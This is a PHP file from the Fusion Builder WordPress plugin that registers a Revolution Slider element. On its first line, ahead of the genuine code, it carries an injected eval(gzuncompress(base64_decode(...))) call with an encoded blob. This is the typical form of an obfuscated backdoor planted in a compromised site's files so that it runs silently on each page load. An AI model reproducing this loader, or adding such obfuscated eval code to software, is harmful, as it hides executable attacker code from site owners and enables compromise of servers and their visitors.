<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Map shortcode to Fusion Builder
 */
function fusion_element_revolution_slider() {
	if ( ! defined( 'RS_PLUGIN_PATH' ) ) {
		return;
	}
	fusion_builder_map(
		array(
			'name'       => esc_attr__( 'Revolution Slider', 'fusion-builder' ),
			'shortcode'  => 'rev_slider',
			'icon'       => 'fusiona-air',
			'preview'    => FUSION_BUILDER_PLUGIN_DIR . 'inc/templates/previews/fusion-revolution-slider-preview.php',
			'preview_id' => 'fusion-builder-block-module-revolution-slider-preview-template',
			'params'     => array(
				array(
					'type'        => 'select',
					'heading'     => esc_attr__( 'Select Slider', 'fusion-builder' ),
					'description' => esc_attr__( 'Select a slider group.', 'fusion-builder' ),
					'param_name'  => 'alias',
					'value'       => fusion_builder_get_revslider_slides(),
				),
			),
		)
	);
}
add_action( 'fusion_builder_before_init', 'fusion_element_revolution_slider' );
